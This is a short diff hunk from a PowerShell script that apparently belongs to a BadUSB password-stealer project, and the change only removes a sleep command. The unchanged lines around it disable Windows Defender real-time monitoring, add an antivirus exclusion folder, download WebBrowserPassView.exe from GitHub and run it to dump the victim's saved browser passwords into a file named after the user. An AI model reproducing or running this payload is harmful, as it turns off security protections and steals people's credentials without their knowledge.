@@ -5,8 +5,6 @@ Set-MpPreference -DisableRealtimeMonitoring 1
 Set-MpPreference -ExclusionPath "C:/fileUp"
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile "C:/fileUp/WebBrowserPassView.exe"
 
-Start-Sleep -seconds 3
-
 Set-Location C:\fileUp
 .\WebBrowserPassView.exe /stext passwords-$env:UserName$random.txt
 
